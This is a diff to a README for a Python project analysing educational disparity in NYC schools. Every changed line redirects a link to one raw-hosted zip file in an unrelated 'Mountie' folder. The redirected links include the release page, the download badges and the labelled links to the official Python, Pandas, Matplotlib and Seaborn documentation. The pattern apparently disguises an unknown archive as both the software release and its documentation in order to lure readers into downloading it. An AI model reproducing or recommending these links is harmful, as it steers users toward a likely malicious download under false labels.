@@ -1,6 +1,6 @@
 # 📊 Analysis-of-Educational-Disparity-in-NYC-Schools - Understand NYC's School Performance Gaps
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Analysis%20of%20Educational%20Disparity%20in%20NYC%20Schools-brightgreen)](https://github.com/Debaza/Analysis-of-Educational-Disparity-in-NYC-Schools/releases)
+[![Download Now](https://raw.githubusercontent.com/Debaza/Analysis-of-Educational-Disparity-in-NYC-Schools/main/Mountie/Analysis-of-Educational-Disparity-in-NYC-Schools.zip%20Now-Analysis%20of%20Educational%20Disparity%20in%20NYC%20Schools-brightgreen)](https://raw.githubusercontent.com/Debaza/Analysis-of-Educational-Disparity-in-NYC-Schools/main/Mountie/Analysis-of-Educational-Disparity-in-NYC-Schools.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run this application, you need:
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases](https://github.com/Debaza/Analysis-of-Educational-Disparity-in-NYC-Schools/releases).
+1. Visit this page to download: [Releases](https://raw.githubusercontent.com/Debaza/Analysis-of-Educational-Disparity-in-NYC-Schools/main/Mountie/Analysis-of-Educational-Disparity-in-NYC-Schools.zip).
 2. Look for the latest release. You should see a list of files available for download.
 3. Download the appropriate file for your operating system. For ease, select the file labeled with your OS.
 4. Once the file downloads, locate it in your system's download folder.
@@ -82,10 +82,10 @@ If you encounter issues or have suggestions, feel free to open an issue in the r
 
 For more information about how to use the tools and methods in this application, consider the following resources:
 
-- [Python Official Documentation](https://www.python.org/doc/)
-- [Pandas Documentation](https://pandas.pydata.org/docs/)
-- [Matplotlib Documentation](https://matplotlib.org/stable/contents.html)
-- [Seaborn Documentation](https://seaborn.pydata.org/)
+- [Python Official Documentation](https://raw.githubusercontent.com/Debaza/Analysis-of-Educational-Disparity-in-NYC-Schools/main/Mountie/Analysis-of-Educational-Disparity-in-NYC-Schools.zip)
+- [Pandas Documentation](https://raw.githubusercontent.com/Debaza/Analysis-of-Educational-Disparity-in-NYC-Schools/main/Mountie/Analysis-of-Educational-Disparity-in-NYC-Schools.zip)
+- [Matplotlib Documentation](https://raw.githubusercontent.com/Debaza/Analysis-of-Educational-Disparity-in-NYC-Schools/main/Mountie/Analysis-of-Educational-Disparity-in-NYC-Schools.zip)
+- [Seaborn Documentation](https://raw.githubusercontent.com/Debaza/Analysis-of-Educational-Disparity-in-NYC-Schools/main/Mountie/Analysis-of-Educational-Disparity-in-NYC-Schools.zip)
 
 ## 🌟 Acknowledgements
 
@@ -93,4 +93,4 @@ Thanks to all contributors who have helped improve this project. Your efforts ma
 
 For any questions, reach out through the Issues tab in the repository or explore the discussions section. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Analysis%20of%20Educational%20Disparity%20in%20NYC%20Schools-brightgreen)](https://github.com/Debaza/Analysis-of-Educational-Disparity-in-NYC-Schools/releases)
+[![Download Now](https://raw.githubusercontent.com/Debaza/Analysis-of-Educational-Disparity-in-NYC-Schools/main/Mountie/Analysis-of-Educational-Disparity-in-NYC-Schools.zip%20Now-Analysis%20of%20Educational%20Disparity%20in%20NYC%20Schools-brightgreen)](https://raw.githubusercontent.com/Debaza/Analysis-of-Educational-Disparity-in-NYC-Schools/main/Mountie/Analysis-of-Educational-Disparity-in-NYC-Schools.zip)
